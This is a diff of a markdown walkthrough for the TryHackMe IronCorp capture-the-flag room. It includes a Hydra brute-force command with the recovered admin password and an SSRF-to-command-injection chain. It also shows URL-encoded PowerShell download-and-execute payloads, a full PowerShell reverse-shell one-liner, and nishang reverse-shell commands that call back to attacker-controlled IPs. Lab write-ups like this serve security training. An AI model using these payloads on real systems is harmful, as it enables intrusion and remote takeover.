@@ -7,7 +7,7 @@ Access this walkthrough room clicking <a href="https://tryhackme.com/room/ironco
 
 <br>
 
-<p align="center">Practice <code>nmap</code>, <code>rustscan</code>, <code>dirb</code>,  <code>dig</code></p>
+<p align="center">Practice <code>nmap</code>, <code>rustscan</code>, <code>dirb</code>, <code>dig</code>, <code>Burp Suite</code>,  <code>Hydra</code></p>
 
 <br>
 
@@ -284,7 +284,6 @@ PORT      STATE SERVICE       REASON  VERSION
 
 <br>
 <h3 align="center">dig</h3>
-
 <p align="center">xx.xxx.xx.xxx:<strong>8080</strong><br>
 <strong>ironcorp.me</strong> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp; <strong>admin.ironcorp.me</strong> &nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp;&nbsp;&nbsp;<strong>internal.ironcorp.me</strong></p>
 
@@ -312,6 +311,8 @@ ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
 xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
 ```
 
+<h3 align="center">Web</h3>
+
 <p>
 
 - ironcorp.me:8080<br>
@@ -336,14 +337,14 @@ xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
 ---------- Response = <code>method="GET"</code>, <code>action="#"</code>, <code>name="r"</code>, <code>type="submit"</code><br>
 ---------- Search = <code>ls</code> = 200 OK = <code>/?r=ls#</code></p>
 
-<br>
-<br>
-<h3 align="center">ironcorp.me:8080  |  admin.ironcorp.me:8080   |   internal.ironcorp.me:8080</h3>
+
+<p align="center">ironcorp.me:8080  |  admin.ironcorp.me:8080   |   internal.ironcorp.me:8080</p>
 
 <img width="1126" height="716" alt="image" src="https://github.com/user-attachments/assets/f85ee496-57c0-4e3e-b1d8-77c9613c3dc1" />
 
 <br>
-<h3  align="center">admin.ironcorp.me:11025</h3>
+<br>
+<p  align="center">admin.ironcorp.me:11025</p>
 
 <img width="1134" height="716" alt="image" src="https://github.com/user-attachments/assets/fd1b1996-a020-4c34-9190-6589b44f9e86" />
 
@@ -357,12 +358,12 @@ xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
 <h1 align="center">Command & Control (C2)</h1>
 
 <br>
-<h3  align="center">Search = <code>http://internal.ironcorp.me:8080</code></h3>
+<p  align="center">Search = <code>internal.ironcorp.me:8080</code></p>
 
 <img width="1130" height="671" alt="image" src="https://github.com/user-attachments/assets/b4f5eb98-454c-472f-bf4a-fa24fc4b34f5" />
 
 <br>
-<h3  align="center">Search = <code>http://internal.ironcorp.me:11025</code></h3>
+<p align="center">Search = <code>internal.ironcorp.me:11025</code></p>
 
 <img width="1129" height="202" alt="image" src="https://github.com/user-attachments/assets/820f7a68-76bb-45c2-a6b9-f4aa6cf3167a" />
 
@@ -378,26 +379,27 @@ xx.xxx.xx.xxx ironcorp.me admin.ironcorp.me internal.ironcorp.me
 
 <br>
 <br>
-<p>
- 
-- http://internal.ironcorp.me:11025/name.php?name=</p>
+<p align="center">internal.ironcorp.me:11025/name.php?name=</p>
 
 
 <img width="678" height="231" alt="image" src="https://github.com/user-attachments/assets/141cfcae-1816-4f1c-83c7-ad01b8137582" />
 
-<p>
- 
-- http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi</p>
+<br>
+<br>
+
+<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi</p>
 
 <img width="1245" height="340" alt="image" src="https://github.com/user-attachments/assets/2a30456e-3b84-4a54-a88f-8717b2c96d9d" />
 
 <br>
+<br>
 
 <img width="1220" height="278" alt="image" src="https://github.com/user-attachments/assets/076d2762-3b84-46c9-9c15-94dec7d8b43b" />
 
-<p>
- 
-- http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami</p>
+<br>
+<br>
+
+<p align="center">admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami</p>
 
 <img width="1214" height="248" alt="image" src="https://github.com/user-attachments/assets/9fe97888-e6ca-4e22-91ac-269ac63e1c86" />
 
@@ -437,96 +439,151 @@ Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-<h3>ironcorp.me:8080/login.html</h3>
+<h3 align="center">ironcorp.me:8080/login.html</h3>
 
 <img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/d828e3b1-9a44-44e0-9a56-9b00096c7ca1" />
 
-<h3>ironcorp.me:11025</h3>
+<br>
+<br>
+
+<h3 align="center">ironcorp.me:11025</h3>
 
 <img width="1062" height="351" alt="image" src="https://github.com/user-attachments/assets/15487d11-affb-4284-a147-0a8074d3b687" />
 
+<br>
+<br>
+
 <img width="1062" height="320" alt="image" src="https://github.com/user-attachments/assets/85872486-4a9a-4337-8340-21d9369b4a2c" />
+
+<br>
+<br>
 
 <img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />
 
 
-<h3>Hydra</h3>
-
-<p>admin: password123</p>
+<h3 align="center">Hydra</h3>
+<p align= "center">admin: password123</p>
 
 ```bash
 :~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
 ```
 
-
 <img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />
+
+<br>
+<br>
 
 <img width="1200" height="636" alt="image" src="https://github.com/user-attachments/assets/c395a147-5819-4c0d-95a5-106719691c5e" />
 
+<br>
+<br>
+
 <img width="1195" height="505" alt="image" src="https://github.com/user-attachments/assets/ce5bcf6d-4983-443a-8521-9fad53161fc0" />
 
+<br>
+<br>
 
-
-<h3>Repeater</h3>
+<h3 align="center">Burp Suite, Repeater</h3>
 
 <img width="1191" height="209" alt="image" src="https://github.com/user-attachments/assets/4ff48264-3d11-4720-9f66-bf45151a2b37" />
 
+<br>
+<br>
+
 <img width="1188" height="382" alt="image" src="https://github.com/user-attachments/assets/30bbb507-dd18-4fd7-b735-fcd74cc907bc" />
+
+<br>
+<br>
 
 <img width="1171" height="629" alt="image" src="https://github.com/user-attachments/assets/5eff7c69-215d-434a-9611-06ddc20ad92c" />
 
+<br>
+<br>
 
-<h3>http server</h3>
+<h3 align="center">http server</h3>
 
 ```bash
 :~/IronCorp# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
+```bash
 http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.90.153%3A8000%2FInvoke-PowerShellTcp.ps1#
+```
 
+```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|whoami
+```
 
+
+```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-object system.net.webclient).downloadstring('http://10.201.90.153:8000/Invoke-PowerShellTcp.ps1'/
+```
 
+```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%64%25%36%35%25%37%38%25%36%35%25%36%33%25%32%30%25%36%32%25%37%39%25%37%30%25%36%31%25%37%33%25%37%33%25%32%30%25%32%64%25%36%33%25%32%30%25%32%32%25%32%38%25%34%65%25%36%35%25%37%37%25%32%64%25%34%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%36%35%25%37%34%25%32%65%25%35%37%25%36%35%25%36%32%25%34%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%35%30%25%37%32%25%36%66%25%37%38%25%37%39%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%64%25%35%62%25%34%65%25%36%35%25%37%34%25%32%65%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%35%64%25%33%61%25%33%61%25%34%34%25%36%35%25%36%36%25%36%31%25%37%35%25%36%63%25%37%34%25%34%65%25%36%35%25%37%34%25%37%37%25%36%66%25%37%32%25%36%62%25%34%33%25%37%32%25%36%35%25%36%34%25%36%35%25%36%65%25%37%34%25%36%39%25%36%31%25%36%63%25%37%33%25%33%62%25%36%39%25%37%37%25%37%32%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%39%25%33%30%25%32%65%25%33%31%25%33%35%25%33%33%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%37%63%25%36%39%25%36%35%25%37%38%25%32%32
+```
 
+
+```bash
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
+```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|Invoke-PowerShellTcp.ps1
+```
 
 <img width="961" height="73" alt="image" src="https://github.com/user-attachments/assets/2a2db5bd-f7d7-4605-9d3c-984e81ded5d2" />
 
+<br>
+<br>
+
 <img width="1129" height="505" alt="image" src="https://github.com/user-attachments/assets/412250fc-e92a-4dcd-8d4b-500657ec7dfe" />
 
+<br>
+<br>
 
+```bash
 powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.28.78/Invoke-PowerShellTcp.ps1')
+```
 
+```bash
 http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%32%25%33%38%25%32%65%25%33%37%25%33%38%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+```
 
+```bash
 /?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+```
 
-
-<h3>Invoke-Powershell</h3>
+<h3 align="center">Invoke-Powershell</h3>
 
 <img width="862" height="313" alt="image" src="https://github.com/user-attachments/assets/a5ed30ba-3a31-4fcb-85cf-23f04bee0d3c" />
 
+<br>
+<br>
 
 
 
-
-
+```bash
 :~/IronCorp/nishang/Shells# nano Invoke-PowerShellTcp.ps1
-:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+```
 
+```bash
+:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+```
 
 <img width="1193" height="356" alt="image" src="https://github.com/user-attachments/assets/10c21602-5c84-49da-aafe-f70865d92a02" />
 
+<br>
+<br>
+
+```bash
 :~/IronCorp/nishang/Shells# ls
 Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
 Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
 Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
 :~/IronCorp/nishang/Shells# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
+```
 
 
